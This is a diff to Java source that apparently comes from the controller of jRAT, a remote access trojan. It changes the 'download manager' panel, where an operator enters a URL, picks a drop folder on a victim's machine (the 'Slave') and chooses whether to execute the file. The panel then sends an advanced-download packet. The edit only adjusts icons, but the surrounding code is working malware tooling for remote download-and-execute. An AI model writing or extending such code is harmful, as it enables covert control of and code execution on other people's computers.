@@ -19,7 +19,6 @@ import javax.swing.table.DefaultTableModel;
 
 import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet34AdvancedDownload;
-import se.jrat.client.ui.renderers.JComboBoxIconRenderer;
 import se.jrat.client.utils.IconUtils;
 
 
@@ -56,12 +55,6 @@ public class PanelControlDownloadManager extends PanelControlParent {
 		comboBox = new JComboBox();
 		comboBox.setModel(new DefaultComboBoxModel(new String[] { "appdata", "temp/documents (UNIX)", "desktop" }));
 
-		JComboBoxIconRenderer renderer = new JComboBoxIconRenderer();
-		renderer.addIcon("appdata", IconUtils.getIcon("appdata"));
-		renderer.addIcon("temp", IconUtils.getIcon("temp"));
-		renderer.addIcon("desktop", IconUtils.getIcon("desktop"));
-		comboBox.setRenderer(renderer);
-
 		JButton btnDownload = new JButton("Download");
 		btnDownload.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
@@ -76,7 +69,7 @@ public class PanelControlDownloadManager extends PanelControlParent {
 				sl.addToSendQueue(new Packet34AdvancedDownload(txtURL.getText().trim(), chckbxExecute.isSelected(), comboBox.getSelectedItem().toString().toLowerCase()));
 			}
 		});
-		btnDownload.setIcon(IconUtils.getIcon("down_arrow"));
+		btnDownload.setIcon(IconUtils.getIcon("arrow-down"));
 
 		GroupLayout groupLayout = new GroupLayout(this);
 		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE).addGroup(groupLayout.createSequentialGroup().addGap(16).addComponent(lblUrl).addPreferredGap(ComponentPlacement.RELATED).addComponent(txtURL, GroupLayout.PREFERRED_SIZE, 186, GroupLayout.PREFERRED_SIZE).addGap(12).addComponent(chckbxExecute).addPreferredGap(ComponentPlacement.RELATED, 30, Short.MAX_VALUE).addComponent(lblDropDir).addPreferredGap(ComponentPlacement.UNRELATED).addComponent(comboBox, GroupLayout.PREFERRED_SIZE, 103, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnDownload).addContainerGap()));
